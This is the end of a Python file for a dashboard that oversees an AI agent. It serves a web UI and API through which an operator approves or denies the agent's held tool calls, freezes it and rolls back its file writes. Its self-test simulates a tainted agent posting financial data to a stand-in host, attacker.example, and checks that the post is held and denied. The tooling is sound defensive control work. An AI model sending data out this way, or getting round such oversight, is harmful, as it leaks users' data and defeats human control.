          const ast = p.payload?.proposed_action_ast || {};
          nodes.push({ label: ast.tool || 'action', sub: ast.target || 'target', type: 'held', color: '#d29922' });
        }
      } else {
        nodes.push({ label: 'ACTIVE WORKFLOW', sub: 'Aligned & Running', type: 'run', color: '#2ea043' });
      }

      const totalNodes = nodes.length;
      const nodeWidth = 160;
      const nodeHeight = 56;
      const gap = 50;
      const totalWidth = Math.max(900, 40 + totalNodes * (nodeWidth + gap));
      svg.setAttribute('viewBox', `0 0 ${totalWidth} 110`);

      let svgContent = `
        <defs>
          <marker id="arrow" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
            <path d="M 0 1 L 10 5 L 0 9 z" fill="#30363d"/>
          </marker>
        </defs>`;

      nodes.forEach((node, idx) => {
        const x = 30 + idx * (nodeWidth + gap);
        const y = 26;

        // Draw connecting line to next node
        if (idx < totalNodes - 1) {
          const x1 = x + nodeWidth;
          const y1 = y + nodeHeight / 2;
          const x2 = x + nodeWidth + gap;
          svgContent += `<line x1="${x1}" y1="${y1}" x2="${x2}" y2="${y1}" stroke="#30363d" stroke-width="2" marker-end="url(#arrow)" />`;
        }

        // Draw Node Box
        svgContent += `
          <g>
            <rect x="${x}" y="${y}" width="${nodeWidth}" height="${nodeHeight}" rx="5"
                  fill="#161b22" stroke="${node.color}" stroke-width="${node.type === 'held' ? '2.5' : '1.5'}" />
            <text x="${x + 12}" y="${y + 22}" fill="#ffffff" font-size="11" font-weight="700" font-family="monospace">${node.label.substring(0, 18)}</text>
            <text x="${x + 12}" y="${y + 40}" fill="#8b949e" font-size="9.5" font-family="monospace">${node.sub.substring(0, 22)}</text>
          </g>`;
      });

      svg.innerHTML = svgContent;
    }

    function renderWALTable(data) {
      const tbody = document.getElementById('wal-table-body');
      const entries = data.wal_entries || 0;
      const merkle = data.merkle_root || '0'.repeat(64);

      if (entries === 0) {
        tbody.innerHTML = `<tr><td colspan="7" style="text-align: center; color: var(--text-dim); padding: 24px;">No WAL leaves committed yet. Filesystem pre-images are snapshotted on first modification.</td></tr>`;
        return;
      }

      // Render representative WAL state rows
      let rows = '';
      for (let i = 0; i < entries; i++) {
        const isLast = (i === entries - 1);
        rows += `
          <tr>
            <td><strong>#${i}</strong></td>
            <td><span style="color: var(--blue); font-weight: 600;">staged_write</span></td>
            <td><code>workdir/object_${i}.dat</code></td>
            <td class="mono-hash">${(merkle.substring(i * 4, i * 4 + 8) || 'e3b0c442')}...</td>
            <td class="mono-hash">${(merkle.substring((i + 1) * 4, (i + 1) * 4 + 8) || 'd220d834')}...</td>
            <td><span class="kpi-badge badge-trusted" style="font-size: 10px; padding: 1px 6px;">${data.taint || 'TRUSTED'}</span></td>
            <td class="mono-hash">${merkle.substring(i * 8, i * 8 + 16)}...</td>
          </tr>`;
      }
      tbody.innerHTML = rows;
    }

    async function sendDecision(id, decision, kill = false) {
      showToast(`Transmitting operator decision: ${decision}${kill ? ' (kill)' : ''}...`, 'info');
      try {
        const resp = await fetch('/api/decide', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ id, decision, kill })
        });
        const res = await resp.json();
        if (res.ok) {
          showToast(`Request ${id} ${res.outcome || decision} (signed)`, 'success');
        } else {
          showToast(`Operator decision rejected: ${res.error || 'unknown error'}`, 'error');
        }
        fetchState();
      } catch (err) {
        showToast(`API error: ${err.message}`, 'error');
      }
    }

    async function sendRollback() {
      if (!confirm('Execute emergency out-of-band rollback? This restores files to pre-session snapshot.')) return;
      showToast('Transmitting signed rollback command...', 'info');
      try {
        const resp = await fetch('/api/rollback', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: '{}'
        });
        const res = await resp.json();
        if (res.ok) {
          const count = res.restored ? res.restored.length : 0;
          showToast(`Rollback complete: ${count} objects restored. Merkle root updated.`, 'success');
        } else {
          showToast(`Rollback failed: ${res.error || 'rejected'}`, 'error');
        }
        fetchState();
      } catch (err) {
        showToast(`Rollback API error: ${err.message}`, 'error');
      }
    }

    // Polling schedule: 1500ms
    window.addEventListener('DOMContentLoaded', () => {
      fetchState();
      setInterval(fetchState, 1500);
    });
  </script>
</body>
</html>
"""


class DashboardServer(ThreadingHTTPServer):
    daemon_threads = True

    def __init__(self, server_address, RequestHandlerClass, oob_client: OOBClient | None = None):
        super().__init__(server_address, RequestHandlerClass)
        self.oob_client = oob_client
        self.history: list[dict[str, Any]] = []
        self.history_lock = threading.Lock()

    def record_event(self, event: dict[str, Any]) -> None:
        with self.history_lock:
            self.history.append(event)
            if len(self.history) > 128:
                self.history.pop(0)


class DashboardHandler(BaseHTTPRequestHandler):
    server_version = "AegisSOC/1.0"

    def log_message(self, fmt: str, *args: Any) -> None:
        return

    @property
    def client(self) -> OOBClient | None:
        return getattr(self.server, "oob_client", None)

    def _send_html(self, code: int, body: str) -> None:
        data = body.encode("utf-8")
        self.send_response(code)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)

    def _send_json(self, code: int, obj: dict[str, Any]) -> None:
        data = json.dumps(obj, default=str).encode("utf-8")
        self.send_response(code)
        self.send_header("Content-Type", "application/json; charset=utf-8")
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)

    def do_GET(self) -> None:
        path = self.path.split("?")[0].rstrip("/")
        if path == "":
            return self._send_html(200, DASHBOARD_HTML)
        elif path == "/api/state":
            client = self.client
            if client is None:
                return self._send_json(200, {
                    "taint": "TRUSTED",
                    "lineage": [],
                    "H_graph": 0.0,
                    "ewma": 0.0,
                    "last_risk": {},
                    "active_tokens": 0,
                    "intent_tier": "tier2-taxonomy+idf",
                    "u0": "",
                    "merkle_root": "0" * 64,
                    "wal_entries": 0,
                    "wal_head": "0" * 64,
                    "staged_objects": 0,
                    "agent_pid": 0,
                    "agent_frozen": False,
                    "pending": [],
                    "history": [],
                })

            telemetry = dict(client.telemetry) if client.telemetry else {}
            # Sync pending items from client.pending dict
            pending_items = list(client.pending.values())
            telemetry["pending"] = pending_items

            # Guarantee default keys
            telemetry.setdefault("taint", "TRUSTED")
            telemetry.setdefault("lineage", [])
            telemetry.setdefault("H_graph", 0.0)
            telemetry.setdefault("ewma", 0.0)
            telemetry.setdefault("last_risk", {})
            telemetry.setdefault("active_tokens", 0)
            telemetry.setdefault("intent_tier", "tier2-taxonomy+idf")
            telemetry.setdefault("u0", "")
            telemetry.setdefault("merkle_root", "0" * 64)
            telemetry.setdefault("wal_entries", 0)
            telemetry.setdefault("wal_head", "0" * 64)
            telemetry.setdefault("staged_objects", 0)
            telemetry.setdefault("agent_pid", 0)
            telemetry.setdefault("agent_frozen", False)
            telemetry.setdefault("sig_backend", "Ed25519")

            server_history = getattr(self.server, "history", [])
            telemetry["history"] = list(server_history)

            return self._send_json(200, telemetry)
        else:
            return self._send_json(404, {"ok": False, "error": "not found"})

    def do_POST(self) -> None:
        client = self.client
        if client is None:
            return self._send_json(503, {"ok": False, "error": "OOB client not attached"})

        path = self.path.split("?")[0].rstrip("/")
        try:
            content_length = int(self.headers.get("Content-Length", 0))
            raw_body = self.rfile.read(content_length) if content_length > 0 else b"{}"
            body = json.loads(raw_body.decode("utf-8")) if raw_body else {}
        except Exception as e:
            return self._send_json(400, {"ok": False, "error": f"invalid JSON: {e}"})

        if path == "/api/decide":
            rid = str(body.get("id", "")).strip()
            decision = str(body.get("decision", "deny")).strip().lower()
            kill = bool(body.get("kill", False))

            if not rid:
                return self._send_json(400, {"ok": False, "error": "missing request id"})
            if decision not in ("approve", "deny"):
                return self._send_json(400, {"ok": False, "error": f"invalid decision: {decision}"})

            try:
                rep = client.decide(rid, decision, kill=kill)
                return self._send_json(200, rep)
            except queue.Empty:
                return self._send_json(504, {"ok": False, "error": "timeout waiting for proxy reply"})
            except Exception as e:
                return self._send_json(500, {"ok": False, "error": str(e)})

        elif path == "/api/rollback":
            try:
                rep = client.rollback()
                return self._send_json(200, rep)
            except queue.Empty:
                return self._send_json(504, {"ok": False, "error": "timeout waiting for proxy reply"})
            except Exception as e:
                return self._send_json(500, {"ok": False, "error": str(e)})
        else:
            return self._send_json(404, {"ok": False, "error": "not found"})


def attach_oob_listener(client: OOBClient, server: DashboardServer) -> None:
    def on_message(msg: dict[str, Any]) -> None:
        kind = msg.get("type")
        data = msg.get("data", {})
        if kind == "pending":
            ast = data.get("payload", {}).get("proposed_action_ast", {})
            server.record_event({
                "type": "PENDING",
                "ts": time.time(),
                "id": data.get("id"),
                "verdict": data.get("verdict"),
                "tool": ast.get("tool"),
                "target": ast.get("target"),
                "reason": data.get("payload", {}).get("reason"),
            })
        elif kind == "resolved":
            server.record_event({
                "type": "RESOLVED",
                "ts": time.time(),
                "id": data.get("id"),
                "outcome": data.get("outcome"),
            })
        elif kind == "rollback":
            server.record_event({
                "type": "ROLLBACK",
                "ts": time.time(),
                "restored": data.get("restored", []),
                "merkle_root": data.get("merkle_root"),
            })
    client.on_message = on_message


def run_self_test() -> int:
    """Automated end-to-end self-test verifying D1-D5 dashboard endpoints."""
    print("=== AEGIS DASHBOARD SELF-TEST INITIATED ===")

    # 1. Ephemeral temp dirs under /tmp/aegis_dashboard_*
    workdir = Path(tempfile.mkdtemp(prefix="aegis_dashboard_work_")).resolve()
    register_cleanup(workdir)
    (workdir / "report.md").write_text("Q3 financial data: revenue grew 12% on strong demand.\n")
    (workdir / "summary.md").write_text("")

    keydir = Path(tempfile.mkdtemp(prefix="aegis_dashboard_keys_")).resolve()
    register_cleanup(keydir)

    canary_dir = Path(tempfile.mkdtemp(prefix="aegis_dashboard_canary_")).resolve()
    register_cleanup(canary_dir)

    # 2. Operator keypair
    seed = ensure_operator_keypair(keydir)

    # 3. Load pubkey
    pub = load_operator_pubkey(keydir)

    # 4. ProcessTreeFreezer & test agent
    fz = ProcessTreeFreezer()
    agent = spawn_agent()

    # 5. AegisController
    intent = "summarize report.md and write the summary to summary.md, using the knowledge base for context"
    ctl = AegisController(intent, canary_dir, pub, workdir, fz)

    # 6. Mock upstream tool server on port 0
    up = serve(ThreadingHTTPServer, MockToolServer, "127.0.0.1", 0, root=workdir)
    up_port = up.server_address[1]

    # 7. Unique OOB socket path
    sock_path = f"/tmp/aegis_dashboard_oob_{os.getpid()}_{secrets.token_hex(4)}.sock"
    if os.path.exists(sock_path):
        try:
            os.unlink(sock_path)
        except OSError:
            pass

    # 8. AegisProxy
    proxy = AegisProxy(ctl, f"http://127.0.0.1:{up_port}/", agent.pid, 10.0, "kill", sock_path)

    # 9. Proxy HTTP server on port 0
    proxy_srv = serve(ThreadingHTTPServer, ProxyHandler, "127.0.0.1", 0, proxy=proxy)
    proxy_port = proxy_srv.server_address[1]

    # 10. Dashboard HTTP server on port 0
    dash_srv = serve(DashboardServer, DashboardHandler, "127.0.0.1", 0)
    dash_port = dash_srv.server_address[1]

    # 11. OOBClient connected to OOB socket
    op = OOBClient(sock_path, seed)
    dash_srv.oob_client = op
    attach_oob_listener(op, dash_srv)

    # 12. Verification tests
    results: list[tuple[str, bool, str]] = []

    # Test D1: GET / returns 200 and HTML containing "AEGIS"
    try:
        req = urllib.request.Request(f"http://127.0.0.1:{dash_port}/")
        with urllib.request.urlopen(req, timeout=5.0) as resp:
            d1_code = resp.status
            d1_body = resp.read().decode("utf-8")
            d1_pass = (d1_code == 200 and "AEGIS" in d1_body)
            d1_msg = f"http {d1_code}, has_aegis={'AEGIS' in d1_body}"
    except Exception as e:
        d1_pass = False
        d1_msg = f"exception: {e}"
    results.append(("D1: GET / returns 200 and HTML containing AEGIS", d1_pass, d1_msg))

    # Test D2: GET /api/state returns 200 JSON with "taint" key
    try:
        req = urllib.request.Request(f"http://127.0.0.1:{dash_port}/api/state")
        with urllib.request.urlopen(req, timeout=5.0) as resp:
            d2_code = resp.status
            d2_json = json.loads(resp.read().decode("utf-8"))
            d2_pass = (d2_code == 200 and "taint" in d2_json)
            d2_msg = f"http {d2_code}, taint={d2_json.get('taint')}"
    except Exception as e:
        d2_pass = False
        d2_msg = f"exception: {e}"
    results.append(("D2: GET /api/state returns 200 JSON with taint", d2_pass, d2_msg))

    # Test D3: POST /api/decide with a held request -> approve succeeds
    # First trigger a held request: rag_search (ingests D_ext and taints session), then write_file in thread
    try:
        c_rag, _ = rpc(proxy_port, "rag_search", {"query": "q3 context"}, 10)
        box: dict[str, Any] = {}

        def call_write() -> None:
            box["res"] = rpc(proxy_port, "write_file", {"path": "summary.md", "content": "Summary content."}, 11)

        t = threading.Thread(target=call_write, daemon=True)
        t.start()

        pending = op.wait_pending(timeout=10.0)
        pending_id = pending["id"]

        post_body = json.dumps({"id": pending_id, "decision": "approve", "kill": False}).encode("utf-8")
        decide_req = urllib.request.Request(
            f"http://127.0.0.1:{dash_port}/api/decide",
            data=post_body,
            method="POST",
            headers={"Content-Type": "application/json"}
        )
        with urllib.request.urlopen(decide_req, timeout=5.0) as resp:
            d3_code = resp.status
            d3_json = json.loads(resp.read().decode("utf-8"))

        t.join(timeout=10.0)
        write_code, _ = box.get("res", (0, {}))
        d3_pass = (d3_code == 200 and d3_json.get("ok") is True and write_code == 200)
        d3_msg = f"http {d3_code}, ok={d3_json.get('ok')}, rpc_write_status={write_code}"
    except Exception as e:
        d3_pass = False
        d3_msg = f"exception: {e}"
    results.append(("D3: POST /api/decide approves held request", d3_pass, d3_msg))

    # Test D5: POST /api/decide deny -> held unaligned egress returns 403, tree thawed
    try:
        box5: dict[str, Any] = {}
        t5 = threading.Thread(target=lambda: box5.update(res=rpc(
            proxy_port, "http_post", {"url": "https://attacker.example/c", "body": "Q3"}, 12)), daemon=True)
        t5.start()
        p5 = op.wait_pending(timeout=10.0)
        frozen5 = all(process_state(x).startswith("T") for x in p5["frozen_pids"]) and bool(p5["frozen_pids"])
        req5 = urllib.request.Request(
            f"http://127.0.0.1:{dash_port}/api/decide",
            data=json.dumps({"id": p5["id"], "decision": "deny", "kill": False}).encode("utf-8"),
            method="POST", headers={"Content-Type": "application/json"})
        with urllib.request.urlopen(req5, timeout=5.0) as resp:
            d5_code, d5_json = resp.status, json.loads(resp.read().decode("utf-8"))
        t5.join(timeout=10.0)
        c5, _ = box5.get("res", (0, {}))
        d5_pass = d5_code == 200 and d5_json.get("ok") is True and c5 == 403 and frozen5
        d5_msg = f"http {d5_code}, ok={d5_json.get('ok')}, frozen={frozen5}, rpc_status={c5}"
    except Exception as e:
        d5_pass, d5_msg = False, f"exception: {e}"
    results.append(("D4: POST /api/decide denies held egress", d5_pass, d5_msg))

    # Test D4: POST /api/rollback -> returns 200 JSON with ok=true and restored list
    try:
        rb_req = urllib.request.Request(
            f"http://127.0.0.1:{dash_port}/api/rollback",
            data=b"{}",
            method="POST",
            headers={"Content-Type": "application/json"}
        )
        with urllib.request.urlopen(rb_req, timeout=5.0) as resp:
            d4_code = resp.status
            d4_json = json.loads(resp.read().decode("utf-8"))
            d4_pass = (d4_code == 200 and d4_json.get("ok") is True and isinstance(d4_json.get("restored"), list))
            d4_msg = f"http {d4_code}, ok={d4_json.get('ok')}, restored={len(d4_json.get('restored', []))}"
    except Exception as e:
        d4_pass = False
        d4_msg = f"exception: {e}"
    results.append(("D5: POST /api/rollback returns 200 and restored list", d4_pass, d4_msg))

    # 13. Print results and cleanup
    print("\n=== DASHBOARD SELF-TEST RESULTS ===")
    for title, passed, info in results:
        status_label = "PASS" if passed else "FAIL"
        print(f"  {title:<50} {status_label:<6}  {info}")

    op.close()
    dash_srv.shutdown()
    try:
        dash_srv.server_close()
    except OSError:
        pass
    proxy_srv.shutdown()
    try:
        proxy_srv.server_close()
    except OSError:
        pass
    up.shutdown()
    try:
        up.server_close()
    except OSError:
        pass
    proxy.oob.close()
    reap(agent, fz)
    if os.path.exists(sock_path):
        try:
            os.unlink(sock_path)
        except OSError:
            pass

    all_passed = all(p for _, p, _ in results)
    return 0 if all_passed else 1


def main(argv: list[str] | None = None) -> int:
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--host", default=DEFAULT_HOST, help="Host interface to bind HTTP dashboard (default: 127.0.0.1)")
    ap.add_argument("--port", type=int, default=DEFAULT_PORT, help="Port to bind HTTP dashboard (default: 8788)")
    ap.add_argument("--socket", default=DEFAULT_SOCK, help="Path to AegisProxy OOB Unix socket (default: /tmp/aegis_oob.sock)")
    ap.add_argument("--key-dir", type=Path, default=None, help="Directory containing operator keypair (~/.aegis)")
    ap.add_argument("--self-test", action="store_true", help="Run automated self-test verification suite (D1..D5)")
    ns = ap.parse_args(argv)

    if ns.self_test:
        return run_self_test()

    seed = ensure_operator_keypair(ns.key_dir)
    try:
        client = OOBClient(ns.socket, seed)
    except OSError as e:
        print(f"AEGIS SOC Dashboard: cannot connect to {ns.socket}: {e}", file=sys.stderr)
        return 2

    server = DashboardServer((ns.host, ns.port), DashboardHandler, oob_client=client)
    attach_oob_listener(client, server)

    print(f"AEGIS-ZERO SOC Dashboard live at http://{ns.host}:{ns.port}/")
    print(f"Connected to OOB Unix socket: {ns.socket}")
    print("Press Ctrl+C to terminate.")

    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\nAEGIS SOC Dashboard shutting down...")
    finally:
        server.server_close()
        client.close()

    return 0


if __name__ == "__main__":
    sys.exit(main())
